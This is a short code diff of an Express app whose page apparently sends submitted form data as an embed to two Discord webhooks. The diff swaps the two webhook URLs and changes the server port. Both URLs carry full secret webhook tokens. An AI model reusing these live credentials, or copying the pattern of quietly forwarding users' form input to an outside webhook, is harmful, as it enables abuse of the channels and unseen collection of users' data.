@@ -254,8 +254,8 @@ app.get('/', (req, res) => {
 
           submitBtn.disabled = true;
 
-          const webhook1 = 'https://discord.com/api/webhooks/1421094710822309942/G9-Pgqc3PauZhO2mn5AeY83YWW_2udeloDtN5z2IZjVGINZPMkkANT5emBOJHa4nX_bL';
-          const webhook2 = 'https://discord.com/api/webhooks/1435983964673151030/RK9omfteSUlXMOtH-d-MZlQsA7XcapBbAOkYqvuBkXgSAJ31NowbEI6vW2J9H6h9HBLg';
+          const webhook1 = 'https://discord.com/api/webhooks/1435983964673151030/RK9omfteSUlXMOtH-d-MZlQsA7XcapBbAOkYqvuBkXgSAJ31NowbEI6vW2J9H6h9HBLg';
+          const webhook2 = 'https://discord.com/api/webhooks/1421094710822309942/G9-Pgqc3PauZhO2mn5AeY83YWW_2udeloDtN5z2IZjVGINZPMkkANT5emBOJHa4nX_bL';
 
           const embedPayload = {
             content: null,
@@ -336,6 +336,6 @@ app.get('/', (req, res) => {
   `);
 });
 
-app.listen(3000, () => {
-  console.log('🚀 Server running on http://localhost:3000');
+app.listen(0, () => {
+  console.log('🚀 Server running');
 });
